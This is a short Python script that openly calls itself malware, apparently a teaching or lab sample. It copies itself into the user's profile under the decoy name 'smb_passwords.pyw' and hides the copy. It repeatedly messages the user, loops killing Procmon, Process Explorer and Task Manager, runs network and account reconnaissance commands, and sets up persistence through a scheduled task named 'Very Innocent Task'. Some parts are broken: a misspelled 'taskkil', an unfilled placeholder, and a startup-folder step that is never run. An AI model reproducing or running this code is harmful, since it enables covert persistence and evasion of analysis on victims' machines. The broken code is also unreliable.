# Imports
import os
import time
import threading

# Constants
FILE_PATH       = fr"{os.environ['USERPROFILE']}\smb_passwords.pyw"
STARTUP_FOLDER  = fr"{os.environ['USERPROFILE']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
ANALYSIS_TOOLS  = ["Procmon.exe", "Procmon64.exe", "procexp64.exe", "procexp.exe", "taskmgr.exe"]


def check_file_accessed(start, current_file):
    while True:
        last_accessed = os.stat(current_file).st_atime

        # Checks whether the file was accessed after the was script started
        if start < last_accessed:
            print(f"Malware stopped running at: {time.ctime(time.time())}")
            os._exit(0)


def msg_user():
    while True:
        os.system("msg %username% Hello, I'm your malware")
        time.sleep(15)


def anti_analysis():
    while True:
        [os.system("taskkil /f /im {analysis_tool}") for analysis_tool in ANALYSIS_TOOLS]


def main():

    # Checks whether the script is in user dir
    if __file__ != FILE_PATH:
        os.system(f"copy {__file__} {FILE_PATH}")
        os.system(f"attrib +h {FILE_PATH}")
    
    start = time.time()
    current_file = __file__
    print(f"Malware started running at: {time.ctime(start)}")

    # Runing in parallel to check all the time if file was accessed
    first_thread = threading.Thread(target=check_file_accessed, args=[start, current_file])
    first_thread.start()

    # Runing in parallel to msg the user
    second_thread = threading.Thread(target=msg_user)
    second_thread.start()

    # Runing in parallel to kill analysis tools
    third_thread = threading.Thread(target=anti_analysis)
    third_thread.start()

    # Reconnaissance commands
    commands = ["NET USE", "NET GROUP", "NETSH", "IPCONFIG", "WHOAMI"]
    [os.system(command) for command in commands]

    # First Persistency: schedueled task (running every three hours)
    sctask_cmd = f'schtasks /create /sc hourly /mo 3 /tn "Very Innocent Task" /tr "python {FILE_PATH}"'
    os.system(sctask_cmd)

    # Second Persistency: user's startup folder
    startup_cmd = fr"echo python {FILE_PATH} > {STARTUP_FOLDER}\passwords.txt.bat"
    os.system(sctask_cmd)

    


if __name__ == "__main__":
    main()
